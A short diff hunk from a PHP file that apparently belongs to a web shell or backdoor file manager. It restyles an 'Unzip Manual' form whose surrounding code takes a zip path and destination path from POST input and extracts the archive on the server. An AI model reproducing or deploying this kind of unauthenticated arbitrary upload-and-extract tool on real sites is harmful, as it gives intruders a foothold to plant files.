@@ -387,7 +387,7 @@ echo '<table style="width:100%" border="1">
 <input type="submit" name="submit" value="Upload And Unzip" />
 </form>';
 if($message) echo "<p>$message</p>";
-	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='".path()."/namefile.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'><br>Save To:</font><br><input type='text' name='save' value='".path()."/' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
+	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'>Zip Location:<br><input type='text' name='dir' value='".path()."/namefile.zip' style='width: 450px;' height='10'><br><br>Save To:<br><input type='text' name='save' value='".path()."/' style='width: 450px;' height='10'><br><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
 	if($_POST['extrak']){
 	$save=$_POST['save'];
 	$zip = new ZipArchive;
